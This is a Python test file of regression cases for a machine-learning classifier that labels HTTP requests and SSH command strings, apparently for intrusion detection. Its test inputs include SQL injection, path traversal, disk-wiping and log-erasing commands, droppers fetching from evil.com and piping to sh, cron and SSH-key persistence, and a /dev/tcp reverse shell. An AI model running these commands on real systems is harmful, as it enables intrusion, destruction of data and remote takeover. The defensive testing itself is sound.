"""
Regression tests for known attack patterns.

These are "golden tests" — specific attack payloads
that the model MUST classify correctly. If any of
these fail after a retrain, it signals a regression.

Tests cover: HTTP attacks, SSH attacks, and Safe traffic.
"""

import pytest
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

# Import the helper from conftest
from tests.conftest import predict_single


# ════════════════════════════════════════════
# HTTP Attack Payloads
# ════════════════════════════════════════════

class TestHTTPAttacks:
    """HTTP-based attack detection regression tests."""

    # ── Safe Traffic (must NOT trigger) ──

    def test_safe_get(self, model):
        _, name, conf, _ = predict_single(
            model,
            "GET /index.html HTTP/1.1\n"
            "Host: example.com\n"
            "User-Agent: Mozilla/5.0",
            is_http=True,
        )
        assert name == "Safe", \
            f"Normal GET misclassified as {name}"
        assert conf > 0.8

    def test_safe_favicon(self, model):
        _, name, conf, _ = predict_single(
            model,
            "GET /favicon.ico HTTP/1.1\n"
            "Host: example.com",
            is_http=True,
        )
        assert name == "Safe"

    # ── SQL Injection ──

    def test_sqli_post_body(self, model):
        _, name, conf, probs = predict_single(
            model,
            "POST /api/login HTTP/1.1\n"
            "Host: target.com\n"
            "Content-Type: application/x-www-form-urlencoded\n"
            "\n"
            "username=admin&password=' OR '1'='1",
            is_http=True,
        )
        assert name == "Exploit", \
            f"SQLi POST classified as {name} ({conf:.1%})"

    # ── Path Traversal ──

    def test_path_traversal(self, model):
        _, name, conf, probs = predict_single(
            model,
            "GET /../../../../../../etc/passwd HTTP/1.1\n"
            "Host: target.com",
            is_http=True,
        )
        assert name == "Exploit", \
            f"Path traversal classified as {name}"

    # ── Destructive via HTTP ──

    def test_http_destructive(self, model):
        _, name, conf, probs = predict_single(
            model,
            "GET / HTTP/1.1\n"
            "Host: target.com; "
            "rm -rf /; dd if=/dev/zero of=/dev/sda",
            is_http=True,
        )
        assert name in ("Destructive", "Exploit"), \
            f"Destructive HTTP classified as {name}"


# ════════════════════════════════════════════
# SSH Attack Payloads
# ════════════════════════════════════════════

class TestSSHAttacks:
    """SSH-based attack detection regression tests."""

    # ── Safe SSH ──

    def test_safe_ssh_commands(self, model):
        _, name, conf, _ = predict_single(
            model,
            "ls; pwd; cd /home; exit",
            is_http=False,
        )
        assert name == "Safe", \
            f"Safe SSH classified as {name}"

    def test_safe_ssh_empty(self, model):
        _, name, conf, _ = predict_single(
            model,
            "exit",
            is_http=False,
        )
        assert name == "Safe"

    # ── SSH Recon / Discovery ──

    def test_ssh_recon_basic(self, model):
        _, name, conf, probs = predict_single(
            model,
            "id; whoami; uname -a; "
            "cat /etc/passwd; "
            "netstat -tlnp; ps aux",
            is_http=False,
        )
        assert name in ("Recon", "Exploit"), \
            f"SSH recon classified as {name}"

    def test_ssh_network_scan(self, model):
        _, name, conf, probs = predict_single(
            model,
            "nmap -sV 192.168.1.0/24; "
            "cat /proc/net/tcp; "
            "ss -tulpn",
            is_http=False,
        )
        assert name in ("Recon", "Exploit"), \
            f"Network scan classified as {name}"

    # ── SSH Downloader ──

    def test_ssh_wget_dropper(self, model):
        _, name, conf, probs = predict_single(
            model,
            "cd /tmp; "
            "wget http://evil.com/malware -O rat; "
            "chmod +x rat; "
            "./rat",
            is_http=False,
        )
        assert name in ("Downloader", "Exploit", "ADVANCED_APT"), \
            f"Wget dropper classified as {name}"

    def test_ssh_curl_dropper(self, model):
        _, name, conf, probs = predict_single(
            model,
            "curl -s http://c2.evil.com/payload | sh",
            is_http=False,
        )
        assert name in ("Downloader", "Exploit", "ADVANCED_APT"), \
            f"Curl dropper classified as {name}"

    # ── SSH Destructive ──

    def test_ssh_destructive(self, model):
        _, name, conf, probs = predict_single(
            model,
            "rm -rf / --no-preserve-root; "
            "dd if=/dev/zero of=/dev/sda; "
            "mkfs.ext4 /dev/sda1",
            is_http=False,
        )
        assert name == "Destructive", \
            f"Destructive SSH classified as {name}"

    def test_ssh_wipe_logs(self, model):
        _, name, conf, probs = predict_single(
            model,
            "rm -rf /var/log/*; "
            "history -c; "
            "cat /dev/null > ~/.bash_history",
            is_http=False,
        )
        assert name in ("Destructive", "ADVANCED_APT"), \
            f"Log wipe classified as {name}"

    # ── SSH APT / Persistence ──

    def test_ssh_apt_persistence(self, model):
        _, name, conf, probs = predict_single(
            model,
            "echo 'ssh-rsa AAAA...' >> "
            "~/.ssh/authorized_keys; "
            "crontab -l | { cat; "
            "echo '*/5 * * * * /tmp/beacon'; "
            "} | crontab -; "
            "wget http://c2.evil.com/rat -O /tmp/rat; "
            "chmod +x /tmp/rat; "
            "nohup /tmp/rat &",
            is_http=False,
        )
        assert name in ("ADVANCED_APT", "Exploit", "Downloader"), \
            f"APT persistence classified as {name}"

    def test_ssh_reverse_shell(self, model):
        _, name, conf, probs = predict_single(
            model,
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            is_http=False,
        )
        assert name != "Safe", \
            f"Reverse shell classified as Safe!"
